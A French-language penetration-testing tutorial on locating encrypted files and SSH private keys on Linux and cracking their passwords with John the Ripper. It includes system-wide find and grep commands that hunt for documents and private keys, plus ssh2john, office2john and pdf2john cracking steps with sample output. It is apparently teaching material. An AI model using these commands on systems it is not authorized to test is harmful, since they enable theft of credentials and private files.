# Fichiers Protégés

### <mark style="color:blue;">Types de Chiffrement</mark>

* **Chiffrement symétrique (ex. AES-256)** : Un seul et même mot de passe est utilisé pour chiffrer et déchiffrer les fichiers.
* **Chiffrement asymétrique** : Deux clés distinctes sont nécessaires. La clé publique sert à chiffrer, et la clé privée déchiffre les fichiers.

***

### <mark style="color:blue;">Recherche de Fichiers Protégés</mark>

On peut identifier des fichiers chiffrés par leurs extensions. Voici une commande pour rechercher des fichiers communs sur un système Linux :

```bash
for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*"); do
  echo -e "\nExtension : " $ext;
  find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core";
done
```

**Exemple de résultat :**

* **Extension : .csv**
  * /home/utilisateur/Docs/emails-clients.csv
  * /home/utilisateur/ruby/test/fixtures/header.csv
* **Extension : .od**\*
  * /home/utilisateur/Docs/projet.odt
  * /home/utilisateur/Docs/améliorations-produit.odp

***

### <mark style="color:blue;">Recherche de Clés SSH</mark>

Les clés SSH se reconnaissent par des entêtes spécifiques, comme "**BEGIN OPENSSH PRIVATE KEY**". Voici une commande pour les localiser :

```bash
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
```

**Exemple de sortie :**

```plaintext
/home/utilisateur/.ssh/interne.key:1:-----BEGIN OPENSSH PRIVATE KEY-----
/home/utilisateur/.ssh/privé.key:1:-----BEGIN OPENSSH PRIVATE KEY-----
```

Si la clé est chiffrée, elle sera protégée par une passphrase. Voici un exemple d’entête :

```plaintext
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2109D25CC91F8DBFCEB0F7589066B2CC
```

#### Décryptage avec John the Ripper

**John the Ripper** offre divers scripts pour convertir des fichiers en hachages exploitables. On peut localiser ces scripts avec la commande :

```bash
locate *2john*
```

**Exemple de scripts :**

* /usr/bin/ssh2john.py
* /usr/bin/zip2john

**Processus de décryptage des clés SSH :**

1. Générer un hachage à partir d’une clé SSH :

```bash
ssh2john.py cle-ssh > ssh.hash
```

2. Utiliser un fichier de mots de passe pour casser le hachage :

```bash
john --wordlist=rockyou.txt ssh.hash
```

3. Afficher les mots de passe trouvés :

```bash
john ssh.hash --show
```

**Exemple de sortie :**

```plaintext
cle-ssh:1234
```

#### Décryptage de Documents Protégés

John permet aussi de décrypter des fichiers Office et PDF via des scripts comme **office2john.py** et **pdf2john.py**.

***

### <mark style="color:blue;">**Exemple pour un fichier Word :**</mark>

1. Générer un hachage :

```bash
office2john.py document-protégé.docx > doc.hash
```

2. Casser le mot de passe :

```bash
john --wordlist=rockyou.txt doc.hash
```

3. Afficher le mot de passe :

```bash
john doc.hash --show
```

**Exemple pour un fichier PDF :**

1. Générer un hachage :

```bash
pdf2john.py fichier.pdf > pdf.hash
```

2. Utiliser John pour casser le mot de passe comme pour les fichiers Word.

#### Conclusion

Le chiffrement est essentiel pour protéger les données sensibles. Cependant, avec les outils et scripts appropriés comme John the Ripper, il est possible de contourner ces protections si les mots de passe sont faibles. Il est donc crucial d’utiliser des mots de passe robustes et des méthodes de chiffrement modernes.
